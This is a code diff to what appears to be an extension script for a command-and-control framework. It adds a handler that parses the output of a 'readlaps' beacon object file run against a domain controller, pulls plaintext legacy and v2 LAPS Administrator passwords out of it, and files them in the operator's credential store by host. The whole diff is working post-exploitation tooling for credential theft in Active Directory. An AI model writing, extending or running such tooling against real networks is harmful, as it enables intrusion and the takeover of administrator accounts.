@@ -267,6 +267,55 @@ cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
 
 
+let readlaps_handler = function (task) {
+    const lines = task.text.split(/\r?\n/);
+    let target = "";
+
+    const reTarget = /^\[\*\]\s+Target:\s+(.+)$/;
+    const reLegacyPass = /^\[\+\]\s+Legacy\s+LAPS\s+Password:\s+(.+)$/;
+    const reV2Pass = /^\[\+\]\s+Decrypted\s+Output:\s+(.+)$/;
+
+    for (const line of lines) {
+        const trimmed = line.trim();
+        if (!trimmed) continue;
+
+        let m = reTarget.exec(trimmed);
+        if (m) {
+            target = m[1];
+            continue;
+        }
+
+        let password = null;
+        let type = "laps";
+
+        m = reLegacyPass.exec(trimmed);
+        if (m) {
+            password = m[1];
+            type = "laps-legacy";
+        } else {
+            m = reV2Pass.exec(trimmed);
+            if (m) {
+                password = m[1];
+                type = "laps-v2";
+            }
+        }
+
+        if (password && target) {
+            ax.credentials_add_list([{
+                username: "Administrator",
+                type: "plaintext",
+                password: password,
+                storage: type,
+                realm: target,
+                host: target,
+                tag: "laps"
+            }]);
+        }
+    }
+};
+
+
+
 
 var cmd_readlaps = ax.create_command("readlaps", "Read LAPS password for a computer", "readlaps -dc dc01.domain.local -target WINCLIENT");
 cmd_readlaps.addArgFlagString("-dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). Hostname preferred over IP for LDAP.", "");
@@ -328,10 +377,11 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
         message = `Read LAPS password for ${target_dn}`;
     }
 
-    let bof_params = ax.bof_pack("cstr,cstr,cstr", [dc, dn, searchFilter]);
+    let reportTarget = target ? target : target_dn;
+    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [dc, dn, searchFilter, reportTarget]);
     let bof_path = ax.script_dir() + "_bin/readlaps." + ax.arch(id) + ".o";
 
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, readlaps_handler);
 });
 
 
